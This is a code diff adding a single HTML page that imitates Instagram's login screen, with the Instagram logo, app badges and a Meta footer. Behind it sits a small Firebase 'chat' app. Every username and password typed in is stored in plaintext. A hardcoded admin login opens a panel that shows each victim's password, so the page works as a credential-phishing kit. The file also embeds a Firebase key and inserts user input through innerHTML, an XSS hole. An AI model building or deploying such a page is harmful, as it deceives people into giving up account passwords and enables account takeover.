@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Clone Chat</title>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #fafafa;
+    margin:0;
+    padding:0;
+  }
+  .container {
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+  }
+  .left {
+    flex:1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+  }
+  .left img {
+    max-height:600px;
+    width:auto;
+  }
+  .right {
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+  #loginBox {
+    width: 350px;
+    padding:40px 40px 20px 40px;
+    border:1px solid #dbdbdb;
+    background:white;
+    text-align:center;
+    margin-bottom:10px;
+  }
+  #loginBox img.logo {
+    margin-bottom:20px;
+  }
+  input {
+    width:100%;
+    padding:10px;
+    margin:5px 0;
+    border:1px solid #dbdbdb;
+    background:#fafafa;
+    border-radius:3px;
+  }
+  button {
+    width:100%;
+    padding:10px;
+    margin-top:10px;
+    background:#3897f0;
+    border:none;
+    color:white;
+    font-weight:bold;
+    border-radius:3px;
+    cursor:pointer;
+  }
+  .divider {
+    display:flex;
+    align-items:center;
+    text-align:center;
+    margin:15px 0;
+  }
+  .divider::before, .divider::after {
+    content: '';
+    flex:1;
+    border-bottom:1px solid #dbdbdb;
+  }
+  .divider span {
+    padding:0 10px;
+    color:#8e8e8e;
+    font-size:13px;
+  }
+  #signupBox {
+    width: 350px;
+    border:1px solid #dbdbdb;
+    background:white;
+    padding:15px;
+    text-align:center;
+    font-size:14px;
+    margin-bottom:20px;
+  }
+  #signupBox a { color:#0095f6; text-decoration:none; }
+  .apps {
+    text-align:center;
+  }
+  .apps img {
+    height:40px;
+    margin:5px;
+  }
+  footer {
+    text-align:center;
+    margin-top:30px;
+    font-size:12px;
+    color:#8e8e8e;
+  }
+  /* Chat + Admin Styles */
+  #chatPage, #adminPanel {
+    display:none;
+    width:90%;
+    max-width:500px;
+    margin:20px auto;
+    padding:20px;
+    border:1px solid #ddd;
+    border-radius:10px;
+    background:white;
+  }
+  #publicChat { height:300px; overflow-y:auto; border:1px solid #ccc; margin-bottom:10px; padding:5px;}
+  #liveUsers div { margin:5px 0; padding:5px; border-bottom:1px solid #eee; }
+  /* Responsive */
+  @media (max-width: 850px) {
+    .container {
+      flex-direction:column;
+    }
+    .left {
+      display:none;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container" id="loginPage">
+  <div class="left">
+    <img src="yjhs.avif" alt="Instagram Preview">
+  </div>
+  <div class="right">
+    <div id="loginBox">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" width="180" class="logo">
+      <input type="text" id="loginUsername" placeholder="Phone number, username, or email">
+      <input type="password" id="loginPassword" placeholder="Password">
+      <button onclick="login()">Log In</button>
+      <div class="divider"><span>OR</span></div>
+      <p style="color:#385185; font-weight:bold; cursor:pointer;">Log in with Facebook</p>
+      <p style="font-size:12px; color:#00376b; cursor:pointer;">Forgot password?</p>
+    </div>
+    <div id="signupBox">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="apps">
+      <p>Get the app.</p>
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yO/r/Y0RbfgRP5Y2.png" alt="App Store">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yx/r/3f3tDojZJ74.png" alt="Google Play">
+    </div>
+  </div>
+</div>
+
+<!-- Chat Page -->
+<div id="chatPage">
+  <h2>Public Chat</h2>
+  <div id="publicChat"></div>
+  <input type="text" id="messageInput" placeholder="Type a message">
+  <button id="sendButton" onclick="sendMessage()">Send</button>
+</div>
+
+<!-- Admin Panel -->
+<div id="adminPanel">
+  <h2>Admin Panel</h2>
+  <button id="stopChatBtn" onclick="toggleChat()">Stop Chat</button>
+  <div id="liveUsers"></div>
+</div>
+
+<footer>
+  <p>Meta © 2025 · About · Help · Press · API · Jobs · Privacy · Terms · Locations · Language</p>
+</footer>
+
+<script>
+// Firebase config
+const firebaseConfig = {
+  apiKey: "AIzaSyD0rDXHKp9BIVp3x3OOlqhZnWSf8XfF_NY",
+  authDomain: "coins-72039.firebaseapp.com",
+  databaseURL: "https://coins-72039-default-rtdb.firebaseio.com",
+  projectId: "coins-72039",
+  storageBucket: "coins-72039.firebasestorage.app",
+  messagingSenderId: "878100244630",
+  appId: "1:878100244630:web:0c307e25d7993f5c4e3ab7",
+  measurementId: "G-JGTWXLJQWP"
+};
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+let usernameGlobal = '';
+let isAdmin = false;
+let chatEnabled = true;
+
+// Login
+function login() {
+  const username = document.getElementById('loginUsername').value.trim();
+  const password = document.getElementById('loginPassword').value;
+
+  if(username === "admin" && password === "2511") {
+    isAdmin = true;
+    document.getElementById('loginPage').style.display = 'none';
+    document.getElementById('adminPanel').style.display = 'block';
+    loadLiveUsers();
+    return;
+  }
+
+  if(!username || !password) return alert("Enter username & password");
+
+  database.ref('users/' + username).set({
+    username: username,
+    password: password,
+    online: true,
+    lastActive: Date.now()
+  });
+
+  usernameGlobal = username;
+
+  // Auto logout if admin deletes account
+  database.ref('users/' + usernameGlobal).on('value', snapshot => {
+    if(!snapshot.exists()) {
+      alert("Your account has been deleted by admin.");
+      window.location.reload();
+    }
+  });
+
+  document.getElementById('loginPage').style.display = 'none';
+  document.getElementById('chatPage').style.display = 'block';
+  loadChat();
+}
+
+// Chat functions
+function toggleChat() {
+  chatEnabled = !chatEnabled;
+  database.ref('chatStatus').set({ enabled: chatEnabled });
+  document.getElementById('stopChatBtn').textContent = chatEnabled ? "Stop Chat" : "Start Chat";
+}
+
+database.ref('chatStatus').on('value', snapshot => {
+  const status = snapshot.val();
+  chatEnabled = status ? status.enabled : true;
+  document.getElementById('messageInput').disabled = !chatEnabled;
+  document.getElementById('sendButton').disabled = !chatEnabled;
+});
+
+function sendMessage() {
+  if(!chatEnabled) return alert("Chat has been stopped by admin.");
+  const msg = document.getElementById('messageInput').value.trim();
+  if(msg) {
+    database.ref('publicChat').push({
+      username: usernameGlobal,
+      message: msg,
+      timestamp: Date.now()
+    });
+    document.getElementById('messageInput').value = '';
+  }
+}
+
+function loadChat() {
+  const chatDiv = document.getElementById('publicChat');
+  database.ref('publicChat').on('value', snapshot => {
+    chatDiv.innerHTML = '';
+    snapshot.forEach(msgSnap => {
+      const data = msgSnap.val();
+      const msgElem = document.createElement('div');
+      msgElem.textContent = `${data.username}: ${data.message}`;
+      chatDiv.appendChild(msgElem);
+    });
+    chatDiv.scrollTop = chatDiv.scrollHeight;
+  });
+}
+
+// Admin Panel
+function loadLiveUsers() {
+  const liveUsersDiv = document.getElementById('liveUsers');
+  database.ref('users').on('value', snapshot => {
+    liveUsersDiv.innerHTML = '';
+    snapshot.forEach(userSnap => {
+      const user = userSnap.val();
+      const username = user.username;
+      const password = user.password;
+      if(!username || username === "undefined") { userSnap.ref.remove(); return; }
+
+      const isOnline = user.online ? '🟢 Online' : '⚪ Offline';
+      const lastActive = new Date(user.lastActive).toLocaleTimeString();
+
+      const userDiv = document.createElement('div');
+      userDiv.innerHTML = `<b>${username}</b> | Password: <b>${password}</b> | ${isOnline} | Last Active: ${lastActive}`;
+
+      const deleteBtn = document.createElement('button');
+      deleteBtn.textContent = 'Delete';
+      deleteBtn.onclick = () => {
+        userSnap.ref.remove();
+        database.ref('publicChat').orderByChild('username').equalTo(username).once('value', snap => {
+          snap.forEach(c => c.ref.remove());
+        });
+      };
+      userDiv.appendChild(deleteBtn);
+      liveUsersDiv.appendChild(userDiv);
+    });
+  });
+}
+</script>
+</body>
+</html>
